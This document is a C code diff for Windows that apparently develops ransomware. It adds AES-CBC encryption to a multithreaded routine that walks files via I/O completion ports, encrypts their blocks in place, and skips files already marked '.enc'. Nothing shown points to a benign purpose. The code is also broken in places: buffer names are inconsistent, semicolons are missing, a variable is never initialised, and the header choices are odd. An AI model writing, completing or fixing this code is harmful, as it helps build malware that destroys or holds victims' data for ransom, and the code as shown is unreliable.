@@ -1,7 +1,14 @@
 #define OMIT_LENGHT 512
 #define SHOULD_OMIT 2048
+#include <IoAPI.h>
+#include <fileapi.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <malloc.h>
+#include <processthreadsapi.h>
 
-char *exclude[]={".pdf",".txt"};
+char *exclude[]={".pdf",".txt",".enc"};
 HANDLE CompletionPort;
 
 int should_crypt(char *file)
@@ -79,13 +86,14 @@ return 0;;
 
 
 }
-void block_read(overlapped_enc *ovl)
+void block_read(overlapped_enc *ovl,struct AES_ctx* ctx )
 {
 LARGE_INTEGER li;
 li.QuadPart = (ovl->current_block * BLOCK_SIZE);
 ovl->overlapped.Offset = li.LowPart;
 ovl->overlapped.OffsetHigh = li.HighPart;
       BOOL res = ReadFile(ovl->file,ovl->inpbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
+      AES_CBC_encrypt_buffer(ctx,ovl->impbuff,BLOCK_SIZE);
 ovl->operation = WRITE;
       PostQueuedCompletionStatus(CompletionPort,0,0, (LPOVERLAPPED)ovl);
       return ;
@@ -112,7 +120,7 @@ ovl->operation = READ;
 
 
 }
-void handle_eof(overlapped_enc *ovl)
+void handle_eof(overlapped_enc *ovl,struct AES_ctx* ctx )
 {
 memset(ovl->impbuff,0,BLOCK_SIZE);
 BOOL res = ReadFile(ovl->file,ovl->impbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
@@ -131,7 +139,7 @@ CloseFile(ovl->file);
 
 
 }
-void crypt(char *key)
+void crypt(struct AES_ctx* ctx )
 {
 BOOL result;
 DWORD CompletionKey;
@@ -147,11 +155,11 @@ switch(OverLapped->operation)
     break;
         
     case READ:
-block_read(OverLapped);
+block_read(OverLapped,ctx);
     break;
         
     case HANDLE_EOF:
-handle_eof(OverLapped);
+handle_eof(OverLapped,ctx);
     break;
 
     case CLOSE_IO:
@@ -163,6 +171,8 @@ close_io(OverLapped);
 
 void crypt_all(char *key)
 {
+struct AES_ctx ctx;
+AES_init_ctx(ctx,key);
 DWORD threads;
 HANDLE thread;
   CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
@@ -170,7 +180,7 @@ HANDLE thread;
   {
 do
   {
-thread = CreateThread(0,0,crypt,key,0,0)
+thread = CreateThread(0,0,crypt,ctx,0,0)
 
 threads--
   }
